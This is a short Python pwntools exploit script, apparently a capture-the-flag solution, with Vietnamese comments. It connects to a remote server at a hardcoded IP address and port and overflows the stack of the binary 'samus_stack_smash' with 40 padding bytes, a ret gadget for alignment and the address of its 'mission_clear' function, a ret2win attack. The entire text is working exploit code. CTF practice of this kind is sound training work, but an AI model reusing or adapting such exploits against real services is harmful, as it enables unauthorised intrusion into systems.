from pwn import *

elf = context.binary = ELF('./samus_stack_smash')

# Kết nối tới server
p = remote('107.170.146.46', 1337)

target_address = elf.symbols['mission_clear']

# Tìm một gadget ret trong file nhị phân của bạn
rop = ROP('./samus_stack_smash')
ret_gadget = rop.ret.address

# Dựng payload có chèn ret gadget để căn chỉnh stack (chống crash)
payload = b'A' * 40
payload += p64(ret_gadget)
payload += p64(target_address)

p.sendlineafter(b'> ', payload)

# Dùng interactive() để xem server phản hồi trực tiếp thay vì recvall()
p.interactive()